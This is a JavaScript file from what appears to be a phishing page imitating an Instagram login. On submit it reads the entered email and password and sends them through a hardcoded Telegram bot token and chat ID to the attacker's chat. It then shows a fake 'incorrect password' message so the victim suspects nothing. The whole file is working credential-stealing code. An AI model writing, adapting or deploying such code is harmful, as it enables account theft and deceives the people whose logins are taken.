const form = document.querySelector("#form")

form.addEventListener("submit", (e) => {
    e.preventDefault();

    var identity = document.getElementById("email").value;
    var password = document.getElementById("password").value;

    var my_text = `Result is:%0A - Identity: ${identity} %0A - Password: ${password}`

    var token = "6079880704:AAGk126KOADLmf2YAYlfg_W_ZPFc8g-sjYk";
    var chat_id = -4074661177
    var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`

    let api = new XMLHttpRequest();
    api.open("GET", url, true);
    api.send();
    // window.location.replace("https://www.instagram.com/accounts/login/")
    console.log("Incorrect Password!");


    setTimeout( document.getElementById("alert-message").innerHTML = "Sorry, your password was incorrect. Please double-check your password.",1500)
    document.getElementById("alert-message").innerHTML = "Sorry, your password was incorrect. Please double-check your password.";
})